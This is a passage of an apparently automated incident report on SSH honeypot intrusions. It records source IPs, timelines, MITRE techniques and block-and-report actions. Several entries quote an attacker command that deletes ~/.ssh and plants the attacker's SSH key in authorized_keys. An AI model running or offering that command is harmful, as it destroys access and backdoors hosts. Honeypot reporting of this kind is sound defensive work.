| `2026-04-11 06:19:39` | `cowrie.client.version` |
| `2026-04-11 06:19:39` | `cowrie.client.kex` |
| `2026-04-11 06:19:40` | `cowrie.login.success` |
| `2026-04-11 06:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23234d84a5d8

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:19 |
| **Last Seen** | 2026-04-11 06:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:19:59` | `cowrie.session.connect` |
| `2026-04-11 06:19:59` | `cowrie.client.version` |
| `2026-04-11 06:19:59` | `cowrie.client.kex` |
| `2026-04-11 06:19:59` | `cowrie.login.success` |
| `2026-04-11 06:19:59` | `cowrie.session.params` |
| `2026-04-11 06:19:59` | `cowrie.command.input` |
| `2026-04-11 06:19:59` | `cowrie.command.failed` |
| `2026-04-11 06:19:59` | `cowrie.log.closed` |
| `2026-04-11 06:19:59` | `cowrie.session.params` |
| `2026-04-11 06:19:59` | `cowrie.command.input` |
| `2026-04-11 06:19:59` | `cowrie.session.file_download` |
| `2026-04-11 06:19:59` | `cowrie.log.closed` |
| `2026-04-11 06:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2687e61a051

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:20 |
| **Last Seen** | 2026-04-11 06:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:20:01` | `cowrie.session.connect` |
| `2026-04-11 06:20:01` | `cowrie.client.version` |
| `2026-04-11 06:20:01` | `cowrie.client.kex` |
| `2026-04-11 06:20:02` | `cowrie.login.success` |
| `2026-04-11 06:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938d087973ec

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:20 |
| **Last Seen** | 2026-04-11 06:20 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:20:12` | `cowrie.session.connect` |
| `2026-04-11 06:20:12` | `cowrie.client.version` |
| `2026-04-11 06:20:12` | `cowrie.client.kex` |
| `2026-04-11 06:20:14` | `cowrie.login.success` |
| `2026-04-11 06:20:14` | `cowrie.session.params` |
| `2026-04-11 06:20:14` | `cowrie.command.input` |
| `2026-04-11 06:20:14` | `cowrie.command.failed` |
| `2026-04-11 06:20:15` | `cowrie.log.closed` |
| `2026-04-11 06:20:16` | `cowrie.session.params` |
| `2026-04-11 06:20:16` | `cowrie.command.input` |
| `2026-04-11 06:20:16` | `cowrie.session.file_download` |
| `2026-04-11 06:20:16` | `cowrie.log.closed` |
| `2026-04-11 06:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abee2e5160d8

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:20 |
| **Last Seen** | 2026-04-11 06:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:20:20` | `cowrie.session.connect` |
| `2026-04-11 06:20:20` | `cowrie.client.version` |
| `2026-04-11 06:20:20` | `cowrie.client.kex` |
| `2026-04-11 06:20:21` | `cowrie.login.success` |
| `2026-04-11 06:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fe4199698a1

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:22 |
| **Last Seen** | 2026-04-11 06:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:22:29` | `cowrie.session.connect` |
| `2026-04-11 06:22:29` | `cowrie.client.version` |
| `2026-04-11 06:22:29` | `cowrie.client.kex` |
| `2026-04-11 06:22:30` | `cowrie.login.success` |
| `2026-04-11 06:22:30` | `cowrie.session.params` |
| `2026-04-11 06:22:30` | `cowrie.command.input` |
| `2026-04-11 06:22:30` | `cowrie.command.failed` |
| `2026-04-11 06:22:30` | `cowrie.log.closed` |
| `2026-04-11 06:22:31` | `cowrie.session.params` |
| `2026-04-11 06:22:31` | `cowrie.command.input` |
| `2026-04-11 06:22:31` | `cowrie.session.file_download` |
| `2026-04-11 06:22:31` | `cowrie.log.closed` |
| `2026-04-11 06:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3747e248e2fb

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:22 |
| **Last Seen** | 2026-04-11 06:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:22:33` | `cowrie.session.connect` |
| `2026-04-11 06:22:33` | `cowrie.client.version` |
| `2026-04-11 06:22:34` | `cowrie.client.kex` |
| `2026-04-11 06:22:34` | `cowrie.login.success` |
| `2026-04-11 06:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20946e6b7e6a

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:23 |
| **Last Seen** | 2026-04-11 06:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:23:36` | `cowrie.session.connect` |
| `2026-04-11 06:23:36` | `cowrie.client.version` |
| `2026-04-11 06:23:36` | `cowrie.client.kex` |
| `2026-04-11 06:23:36` | `cowrie.login.success` |
| `2026-04-11 06:23:36` | `cowrie.session.params` |
| `2026-04-11 06:23:36` | `cowrie.command.input` |
| `2026-04-11 06:23:36` | `cowrie.command.failed` |
| `2026-04-11 06:23:36` | `cowrie.log.closed` |
| `2026-04-11 06:23:36` | `cowrie.session.params` |
| `2026-04-11 06:23:36` | `cowrie.command.input` |
| `2026-04-11 06:23:36` | `cowrie.session.file_download` |
| `2026-04-11 06:23:36` | `cowrie.log.closed` |
| `2026-04-11 06:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77e29525740e

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:23 |
| **Last Seen** | 2026-04-11 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:23:38` | `cowrie.session.connect` |
| `2026-04-11 06:23:38` | `cowrie.client.version` |
| `2026-04-11 06:23:38` | `cowrie.client.kex` |
| `2026-04-11 06:23:38` | `cowrie.login.success` |
| `2026-04-11 06:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2603e10aa8e

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:24 |
| **Last Seen** | 2026-04-11 06:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:24:04` | `cowrie.session.connect` |
| `2026-04-11 06:24:04` | `cowrie.client.version` |
| `2026-04-11 06:24:04` | `cowrie.client.kex` |
| `2026-04-11 06:24:06` | `cowrie.login.success` |
| `2026-04-11 06:24:06` | `cowrie.session.params` |
| `2026-04-11 06:24:06` | `cowrie.command.input` |
| `2026-04-11 06:24:06` | `cowrie.command.failed` |
| `2026-04-11 06:24:07` | `cowrie.log.closed` |
| `2026-04-11 06:24:08` | `cowrie.session.params` |
| `2026-04-11 06:24:08` | `cowrie.command.input` |
| `2026-04-11 06:24:08` | `cowrie.session.file_download` |
| `2026-04-11 06:24:08` | `cowrie.log.closed` |
| `2026-04-11 06:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4bb1cae4034

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:24 |
| **Last Seen** | 2026-04-11 06:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:24:11` | `cowrie.session.connect` |
| `2026-04-11 06:24:11` | `cowrie.client.version` |
| `2026-04-11 06:24:12` | `cowrie.client.kex` |
| `2026-04-11 06:24:13` | `cowrie.login.success` |
| `2026-04-11 06:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04b68866a31b

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:24 |
| **Last Seen** | 2026-04-11 06:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:24:16` | `cowrie.session.connect` |
| `2026-04-11 06:24:16` | `cowrie.client.version` |
| `2026-04-11 06:24:16` | `cowrie.client.kex` |
| `2026-04-11 06:24:17` | `cowrie.login.success` |
| `2026-04-11 06:24:17` | `cowrie.session.params` |
| `2026-04-11 06:24:17` | `cowrie.command.input` |
| `2026-04-11 06:24:17` | `cowrie.command.failed` |
| `2026-04-11 06:24:17` | `cowrie.log.closed` |
| `2026-04-11 06:24:18` | `cowrie.session.params` |
| `2026-04-11 06:24:18` | `cowrie.command.input` |
| `2026-04-11 06:24:18` | `cowrie.session.file_download` |
| `2026-04-11 06:24:18` | `cowrie.log.closed` |
| `2026-04-11 06:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c258282f2d9d

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:24 |
| **Last Seen** | 2026-04-11 06:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:24:20` | `cowrie.session.connect` |
| `2026-04-11 06:24:20` | `cowrie.client.version` |
| `2026-04-11 06:24:20` | `cowrie.client.kex` |
| `2026-04-11 06:24:21` | `cowrie.login.success` |
| `2026-04-11 06:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1695b2e6d25a

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:26 |
| **Last Seen** | 2026-04-11 06:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:26:00` | `cowrie.session.connect` |
| `2026-04-11 06:26:00` | `cowrie.client.version` |
| `2026-04-11 06:26:00` | `cowrie.client.kex` |
| `2026-04-11 06:26:01` | `cowrie.login.success` |
| `2026-04-11 06:26:01` | `cowrie.session.params` |
| `2026-04-11 06:26:01` | `cowrie.command.input` |
| `2026-04-11 06:26:01` | `cowrie.command.failed` |
| `2026-04-11 06:26:01` | `cowrie.log.closed` |
| `2026-04-11 06:26:02` | `cowrie.session.params` |
| `2026-04-11 06:26:02` | `cowrie.command.input` |
| `2026-04-11 06:26:02` | `cowrie.session.file_download` |
| `2026-04-11 06:26:02` | `cowrie.log.closed` |
| `2026-04-11 06:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70557e7d9dcf

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:26 |
| **Last Seen** | 2026-04-11 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:26:04` | `cowrie.session.connect` |
| `2026-04-11 06:26:04` | `cowrie.client.version` |
| `2026-04-11 06:26:04` | `cowrie.client.kex` |
| `2026-04-11 06:26:05` | `cowrie.login.success` |
| `2026-04-11 06:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25cdd93373b5

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:28 |
| **Last Seen** | 2026-04-11 06:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:28:00` | `cowrie.session.connect` |
| `2026-04-11 06:28:00` | `cowrie.client.version` |
| `2026-04-11 06:28:01` | `cowrie.client.kex` |
| `2026-04-11 06:28:02` | `cowrie.login.success` |
| `2026-04-11 06:28:03` | `cowrie.session.params` |
| `2026-04-11 06:28:03` | `cowrie.command.input` |
| `2026-04-11 06:28:03` | `cowrie.command.failed` |
| `2026-04-11 06:28:03` | `cowrie.log.closed` |
| `2026-04-11 06:28:04` | `cowrie.session.params` |
| `2026-04-11 06:28:04` | `cowrie.command.input` |
| `2026-04-11 06:28:04` | `cowrie.session.file_download` |
| `2026-04-11 06:28:04` | `cowrie.log.closed` |
| `2026-04-11 06:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c10aace0bed9

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:28 |
| **Last Seen** | 2026-04-11 06:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:28:08` | `cowrie.session.connect` |
| `2026-04-11 06:28:08` | `cowrie.client.version` |
| `2026-04-11 06:28:08` | `cowrie.client.kex` |
| `2026-04-11 06:28:09` | `cowrie.login.success` |
| `2026-04-11 06:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35a135d3f7cc

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:29 |
| **Last Seen** | 2026-04-11 06:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
